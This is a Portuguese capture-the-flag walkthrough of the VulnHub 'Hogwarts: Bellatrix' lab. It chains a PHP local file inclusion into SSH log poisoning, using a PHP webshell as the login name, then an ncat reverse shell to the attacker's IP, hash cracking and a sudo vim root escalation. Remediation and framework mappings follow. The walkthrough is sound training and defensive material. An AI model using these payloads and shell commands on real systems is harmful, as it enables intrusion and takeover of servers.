# Hogwarts: Bellatrix — A Bruxa Negra Não Cuida dos Seus Logs

Olha que loucura, rapaziada!! Bellatrix Lestrange: a seguidora mais fiel de Voldemort, o caos em forma de bruxinha maligna, e aparentemente rodando um servidor web com um PHP `include` que aceita qualquer parâmetro do usuário sem filtro nenhum. Mano, a ironia de uma das vilãs mais poderosas do universo do Harry Potter ser pwneada por um log poisoning é simplesmente sensacional. Essa máquina ensina um dos encadeamentos de ataque mais satisfatórios de segurança web: LFI para SSH log poisoning, resultando em RCE completo. Técnica lendária, véi.

Grande abraço ao criador por empacotar uma cadeia técnica séria dentro do tema Harry Potter. A wordlist secreta e o hash da `lestrange` são um toque de mestre. ᕕ( ᐛ )ᕗ

---

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | Hogwarts: Bellatrix |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/hogwarts-bellatrix,609/ |
| **Técnicas** | Enumeração de serviços com Nmap, análise de código-fonte web, LFI via PHP include, envenenamento de log SSH, reverse shell, coleta de credenciais, quebra de hash (John), sudo vim GTFOBin |
| **CVEs** | CWE-22 (Path Traversal / LFI via PHP include sem sanitização), CWE-78 (Injeção de Comando via envenenamento de log SSH), CWE-269 (Gerenciamento inadequado de privilégios: sudo vim NOPASSWD) |
| **Grupos APT** | APT28 (Fancy Bear): usa cadeias de LFI contra aplicações web em alvos governamentais e de defesa; FIN7: coleta credenciais de artefatos de aplicação em intrusões financeiramente motivadas |

---

## Resumo do Ataque

```
netdiscover → alvo: 192.168.1.31
    |
    v
nmap → SSH (22), HTTP (80)
    |
    v
acessar http://192.168.1.31 → comentário HTML → ikilledsiriusblack.php
    |
    v
LFI confirmado: ?file=/etc/passwd
    |
    v
LFI + /var/log/auth.log → log de autenticação SSH legível
    |
    v
login SSH com payload PHP como nome de usuário → injetado no auth.log
    |
    v
LFI → executa PHP injetado → RCE como www-data
    |
    v
reverse shell → www-data
    |
    v
encontra .secret.dic + Swordofgryffindor → hash de lestrange
    |
    v
john --wordlist=.secret.dic → ihateharrypotter
    |
    v
su lestrange
    |
    v
sudo -l → (ALL) NOPASSWD: /usr/bin/vim
    |
    v
sudo vim -c ':!/bin/sh' → uid=0(root)
    |
    v
cat /root/flag.txt
```

---

## Metodologia

1. Descoberta do host com netdiscover
2. Enumeração de portas e serviços (nmap)
3. Análise do código-fonte web: identificar vulnerabilidade de LFI via comentário HTML
4. Confirmação da LFI via parâmetro `ikilledsiriusblack.php?file=`
5. Verificar se o log de autenticação SSH é legível via LFI
6. Envenenamento do log SSH: injetar webshell PHP como nome de usuário
7. Disparar RCE via LFI apontando para o auth.log envenenado
8. Entregar reverse shell, estabilizar com python3 pty
9. Enumerar diretório web e home em busca de arquivos ocultos
10. Quebrar hash de lestrange com wordlist customizada
11. Escalar privilégios via sudo vim GTFOBin

---

## Passo 1 — Descoberta do Host e Varredura de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.31

nmap -sV -sC -p- 192.168.1.31
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.x
```

Dois serviços: SSH e HTTP. SSH é tanto um alvo de movimento lateral quanto (crucialmente) uma fonte de log poisoning. HTTP é a superfície de ataque principal.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Passo 2 — Enumeração Web e Descoberta da LFI

Acesse `http://192.168.1.31/`. Analise cuidadosamente o código-fonte da página:

```bash
curl -s http://192.168.1.31/ | grep -i "<!--\|include\|file\|hint"
```

O HTML contém um comentário que aponta para `ikilledsiriusblack.php`. Esse nome é uma dica: Sirius Black, morto, e esse arquivo PHP é a arma.

Teste o parâmetro `file`:

```bash
# Testar LFI básica
curl "http://192.168.1.31/ikilledsiriusblack.php?file=/etc/passwd"
```

O conteúdo de `/etc/passwd` é retornado. LFI confirmada. A aplicação PHP está fazendo o equivalente a `include($_GET['file'])` sem nenhuma sanitização.

Agora verifique se os logs SSH são legíveis via LFI:

```bash
curl "http://192.168.1.31/ikilledsiriusblack.php?file=/var/log/auth.log"
```

Se o conteúdo do auth.log aparecer, o log poisoning é possível. Essa é a verificação crítica.

**Nota do mundo real:** Distribuições Linux mais antigas definem `/var/log/auth.log` como legível por todos por padrão. LFI para RCE via envenenamento de log é uma técnica explorada desde 2009 e ainda aparece em ambientes de produção.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Exposta; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Envenenamento do Log SSH

A estratégia: tentativas de login SSH registram o nome de usuário em `/var/log/auth.log`. Se passarmos um payload PHP como nome de usuário, o motor PHP o executará quando a LFI carregar o log.

```bash
# Injetar o webshell via login SSH com falha
ssh '<?php system($_GET["c"]); ?>'@192.168.1.31
# Digite qualquer senha, deixe falhar — o objetivo é escrever no auth.log, não autenticar
```

Verifique se o payload chegou no log e está executável:

```bash
curl "http://192.168.1.31/ikilledsiriusblack.php?file=/var/log/auth.log&c=id"
# Esperado em algum lugar no HTML: uid=33(www-data)
```

Se aparecer `uid=33(www-data)` na resposta, você tem RCE. Mano, que técnica sensacional!

**Nota do mundo real:** O envenenamento de log SSH foi usado em campanhas de 2019-2020 contra servidores web PHP expostos. A misconfiguration (LFI + log legível) é mais comum do que parece.

**MITRE ATT&CK:** T1059.004 — Interpretador de Comando: Unix Shell; T1190 — Explorar Aplicação Exposta

---

## Passo 4 — Entrega do Reverse Shell

Inicie o listener na máquina atacante:

```bash
nc -lvnp 4444
```

Codifique a URL do payload de reverse shell e dispare via log envenenado:

```bash
curl "http://192.168.1.31/ikilledsiriusblack.php?file=/var/log/auth.log&c=ncat+-e+/bin/bash+192.168.1.2+4444"
```

Shell chega como `www-data`. Estabilize imediatamente:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
# Ctrl+Z depois:
stty raw -echo; fg
# Pressione Enter duas vezes
```

Agora você tem um shell totalmente interativo. Bora rapaziada!

**MITRE ATT&CK:** T1059.004 — Interpretador de Comando: Unix Shell

---

## Passo 5 — Coleta de Credenciais

Enumere diretórios no web root e diretórios home em busca de arquivos ocultos:

```bash
find /var/www -type f -ls 2>/dev/null
find /home -type f -ls 2>/dev/null
```

Descubra um diretório com nome codificado em Base64 contendo dois arquivos-chave:

```bash
find / -name ".secret.dic" 2>/dev/null
find / -name "Swordofgryffindor" 2>/dev/null
```

`Swordofgryffindor` contém um hash de senha para o usuário `lestrange`. `.secret.dic` é uma wordlist customizada com tema Harry Potter.

Exfiltre o hash e quebre-o:

```bash
john --wordlist=/caminho/para/.secret.dic lestrange.hash
```

Senha quebrada: `ihateharrypotter`

Caramba, que senha específica! Wordlist temática funciona melhor que o rockyou aqui, véi.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1110.002 — Força Bruta: Quebra de Senha

---

## Passo 6 — Troca de Usuário e Escalonamento de Privilégios

Troque para a conta `lestrange`:

```bash
su lestrange
# Senha: ihateharrypotter
```

Verifique permissões sudo:

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/vim
```

`vim` com sudo root total e sem senha. Escalonamento clássico via GTFOBins:

```bash
sudo vim -c ':!/bin/sh'
```

Shell root gerado imediatamente.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

**Nota do mundo real:** Editores interativos (vim, nano, ht, less) em sudoers equivalem a acesso root irrestrito. É a primeira coisa que qualquer atacante verifica após ganhar acesso inicial.

**MITRE ATT&CK:** T1548.003 — Abusar do Mecanismo de Elevação: Sudo; T1059.004 — Interpretador de Comando: Unix Shell

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado/Quebrado |
|---|---|---|---|
| Hash de usuário | (hash bcrypt/md5 de lestrange) | `/caminho/para/Swordofgryffindor` | ihateharrypotter (via .secret.dic) |
| Credencial | lestrange:ihateharrypotter | Quebrado do Swordofgryffindor | SSH / su |
| Flag root | (conteúdo da flag) | /root/flag.txt | sudo vim GTFOBin |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Principal Lição |
|---|---|---|---|
| 1 | PHP `include` com parâmetro GET bruto | LFI via include sem sanitização afeta milhares de aplicações PHP legadas em produção | Nunca passe input do usuário diretamente para `include`/`require`; use whitelist de caminhos permitidos |
| 2 | Log SSH legível por todos | Permissões padrão em distros Linux antigas deixam /var/log/auth.log legível | Restrinja `/var/log/auth.log` para root:adm com 0640; rotacione logs com permissões adequadas |
| 3 | LFI + log legível = RCE | Log poisoning transforma leitura de arquivo em execução de código | A defesa exige corrigir tanto a LFI quanto as permissões de log; nenhum isoladamente é suficiente |
| 4 | Wordlist customizada para alvos temáticos | Wordlists direcionadas quebram senhas específicas de domínio que o rockyou não encontra | Construa wordlists temáticas durante o reconhecimento para auditorias de senha |
| 5 | sudo vim NOPASSWD | Editores interativos em sudoers dão acesso root irrestrito | Audite sudoers em todos os hosts Linux; nunca permita editores, interpretadores ou shells via sudo |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Exposta (LFI) | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Quebra de Senha | T1110.002 |
| Execução | Execução | Interpretador de Comando: Unix Shell | T1059.004 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Abusar do Mecanismo de Elevação: Sudo | T1548.003 |
| Coleta | Coleta | Dados do Sistema Local | T1005 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Corrigir LFI PHP**: Substituir `include($_GET['file'])` por padrão com whitelist
2. **Restringir permissões de log**: `chmod 640 /var/log/auth.log; chown root:adm /var/log/auth.log`
3. **Remover sudo vim NOPASSWD**: Editar `/etc/sudoers` com `visudo` e remover ou restringir a entrada do vim
4. **Senhas fortes obrigatórias**: Bcrypt com custo 12+; não permitir senhas baseadas no tema da aplicação
5. **Habilitar PHP `open_basedir`**: Restringir acesso a arquivos PHP ao web root

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todas as aplicações PHP; auditar uso de `include`/`require` |
| Proteger | Controle de Acesso | Restringir permissões de log; aplicar privilégio mínimo no sudo |
| Proteger | Segurança de Dados | Armazenar senhas com bcrypt; sem credenciais em texto claro em arquivos da aplicação |
| Detectar | Anomalias e Eventos | Alertar sobre padrões incomuns de nome de usuário SSH (código PHP no auth.log) |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais no host comprometido; corrigir LFI; remover webshells |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-6 | Privilégio Mínimo | sudo restrito a comandos específicos e seguros; sem editores |
| IA-5 | Gerenciamento de Autenticadores | Armazenamento de senhas bcrypt; sem senhas baseadas em tema |
| CM-7 | Funcionalidade Mínima | PHP `open_basedir`; desabilitar funções PHP perigosas |
| SI-10 | Validação de Entrada de Informação | Whitelist de todos os includes de arquivos controlados pelo usuário |

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Consciência Situacional (SITUATION) | Realizar Registro de Logs | MIL2 |

### MITRE D3FEND

- **D3-SFCV** — Validação de Conteúdo de Arquivo de Script (validar caminhos de include PHP contra allowlist)
- **D3-ACH** — Fortalecimento de Configuração de Aplicação (PHP open_basedir, desabilitar funções perigosas)
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional (restrições sudo, permissões de log)

---

## Considerações Finais

Hogwarts: Bellatrix é uma aula magistral de como encadear uma leitura de arquivo simples em comprometimento total do sistema. O caminho LFI para SSH log poisoning é elegante: cada peça (LFI, logs legíveis, execução PHP) é individualmente insuficiente, mas combinadas criam RCE a partir de misconfigurations aparentemente "menores".

A fase de coleta de credenciais é igualmente realista: wordlists customizadas superam listas genéricas quando você entende o contexto do alvo. E a escalação final via sudo vim reforça por que "privilégio mínimo" não é só um buzzword, é uma necessidade.

Se você consegue explicar toda a cadeia de LFI até root numa entrevista de emprego, está demonstrando compreensão real de como vulnerabilidades de aplicações web se encadeiam em comprometimento total do sistema. Essa é a lição aqui. Top demais!

Thanks guys!! (❍ᴥ❍ʋ)
